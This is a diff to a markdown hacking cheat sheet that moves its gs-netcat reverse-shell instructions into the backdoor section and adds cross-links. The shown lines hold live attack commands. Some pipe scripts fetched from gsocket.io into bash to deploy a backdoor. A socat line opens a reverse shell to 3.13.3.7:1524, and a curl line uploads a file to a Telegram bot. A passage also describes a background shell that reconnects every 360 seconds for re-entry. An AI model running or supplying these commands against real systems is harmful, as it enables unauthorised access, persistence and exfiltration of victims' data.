@@ -1493,19 +1493,7 @@ curl -sF document=@file.zip "https://api.telegram.org/bot<TG-BOT-TOKEN>/sendDocu
 <a id="reverse-shell-gs-netcat"></a>
 **5.i.a. Reverse shell with gs-netcat (encrypted)**
 
-Use [gsocket deploy](https://gsocket.io/deploy). It spawns a fully functioning PTY reverse shell. Both, the YOU and the remote system, can be behind NAT and the traffic is routed via a relay network. It also supports file upload/download (Ctrl-e c) and alarms when the admin logs in. If netcat is a swiss army knife than gs-netcat is a german battle axe :>
-
-```sh
-X=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
-# or X=ExampleSecretChangeMe bash -c "$(wget --no-verbose -O- https://gsocket.io/y)"
-```
-
-To connect to the shell from your workstation:
-```sh
-S=ExampleSecretChangeMe bash -c "$(curl -fsSL https://gsocket.io/y)"
-# or gs-netcat -s ExampleSecretChangeMe -i
-# Add -T to tunnel through TOR
-```
+See [6. Backdoors](#backdoor) for a 1-liner to deploy and access a fully functioning PTY reverse shell using [https://gsocket.io/deploy](https://gsocket.io/deploy).
 
 <a id="reverse-shell-bash"></a>
 **5.i.b. Reverse shell with Bash**
@@ -1744,6 +1732,7 @@ socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:3.13.3.7:1524
 <a id="backdoor"></a>
 ## 6. Backdoors
 
+<a id="gsnc"></a>
 Mostly we use gs-netcat's automated deployment script: [https://www.gsocket.io/deploy](https://www.gsocket.io/deploy).
 ```sh
 bash -c "$(curl -fsSLk https://gsocket.io/y)"
@@ -1758,10 +1747,9 @@ or deploy gsocket by running your own deployment server:
 LOG=results.log bash -c "$(curl -fsSL https://gsocket.io/ys)"  # Notice '/ys' instead of '/y'
 ```
 
+See [Reverse Shell / Dumb Shell](#reverse-shell) for simple 1-liner reverse shells.
+
 <a id="backdoor-background-reverse-shell"></a>
-
-See also [asdf](#reverse-shell).
-
 **6.i. Background reverse shell**
 
 A reverse shell that keeps trying to connect back to us every 360 seconds (indefinitely). Often used until a real backdoor can be deployed and guarantees easy re-entry to a system in case our connection gets disconnected. 
